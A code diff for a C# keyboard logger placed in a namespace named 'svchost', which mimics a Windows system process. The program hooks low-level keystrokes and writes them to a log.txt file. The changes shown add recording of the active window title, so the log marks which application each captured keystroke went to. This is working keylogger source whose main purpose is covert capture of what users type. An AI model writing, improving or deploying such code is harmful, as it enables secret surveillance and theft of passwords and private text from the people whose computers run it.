@@ -13,6 +13,9 @@ namespace svchost
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        public static string preWin = "";
+        public static string newWin = "";
+        public static int fstWin = 0;
 
         public static void Main(string[] args)
         {
@@ -26,7 +29,7 @@ namespace svchost
             UnhookWindowsHookEx(_hookID);
         }
 
-        private string GetActiveWindowTitle()
+        private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
             StringBuilder Buff = new StringBuilder(nChars);
@@ -55,13 +58,30 @@ namespace svchost
         private static IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
+
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
 
-                sw.Write(GetActiveWindowTitle());
+                newWin = GetActiveWindowTitle();
+                if(newWin != preWin)
+                {
+                    if (fstWin == 1)
+                    {
+                        preWin = newWin;
+                        sw.Write(Environment.NewLine + Environment.NewLine);
+                        sw.Write("*** " + newWin + " ***");
+                        sw.Write(Environment.NewLine);
+                    }
+                    else
+                    {
+                        sw.Write("*** " + newWin + " ***");
+                        sw.Write(Environment.NewLine);
+                        fstWin = 1;
+                    }
+                }
 
                 switch ((Keys)vkCode)
                 {
